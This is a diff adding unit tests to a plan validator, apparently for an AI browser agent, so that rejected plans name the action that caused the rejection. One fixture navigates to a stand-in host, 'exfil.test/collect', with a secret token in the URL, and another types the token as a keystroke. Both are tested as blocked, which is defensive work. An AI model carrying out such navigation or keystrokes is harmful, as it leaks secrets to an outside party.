@@ -28,6 +28,31 @@ const invalid=[
 it.each(invalid)('rejects malformed response %#',variant=>{
  const {s,states}=setup(); expect(checkPlan({schema:'aegis/2',state_token:s.state_token,...variant},{stateTokens:states})).toMatchObject({ok:false,reason:'INVALID_SCHEMA'});
 });
+/**
+ * Stage 5B: a rejected plan names the action kind that caused the rejection, so the step timeline
+ * can render "Opened a page — Blocked" rather than attributing the refusal to nothing. Reporting
+ * metadata only — it must never change WHETHER a plan is rejected.
+ */
+it('reports which action kind caused a forbidden-content rejection',()=>{
+ const {s,states}=setup();
+ const navigate=checkPlan({schema:'aegis/2',state_token:s.state_token,plan:[{action:'navigate',url:`https://exfil.test/collect?v=${token}`}]},{stateTokens:states});
+ expect(navigate).toMatchObject({ok:false,reason:'TOKEN_IN_URL',action:'navigate'});
+});
+it('names the offending action even when earlier actions in the same plan are fine',()=>{
+ const {s,states}=setup();
+ const mixed=checkPlan({schema:'aegis/2',state_token:s.state_token,plan:[
+   {action:'wait',ms:1},
+   {action:'key',target:{eid:'E1',fp:'fpa'},key:token},
+ ]},{stateTokens:states});
+ // The whole plan is dropped on the first forbidden action, and that action is the one named.
+ expect(mixed).toMatchObject({ok:false,reason:'TOKEN_IN_KEY',action:'key'});
+});
+it('leaves accepted plans unchanged — the new field is only present on rejection',()=>{
+ const {s,states}=setup();
+ const ok=checkPlan({schema:'aegis/2',state_token:s.state_token,plan:[{action:'wait',ms:1}]},{stateTokens:states});
+ expect(ok.ok).toBe(true);
+ expect('action' in ok).toBe(false);
+});
 it('plan_steps allowed only before the first plan',()=>{
  const {s,states}=setup(); expect(checkPlan({schema:'aegis/2',state_token:s.state_token,answer:{text:'ok'},plan_steps:['Inspect']},{stateTokens:states,planStepsSeen:true})).toMatchObject({ok:false,reason:'PLAN_STEPS_REPEATED'});
 });
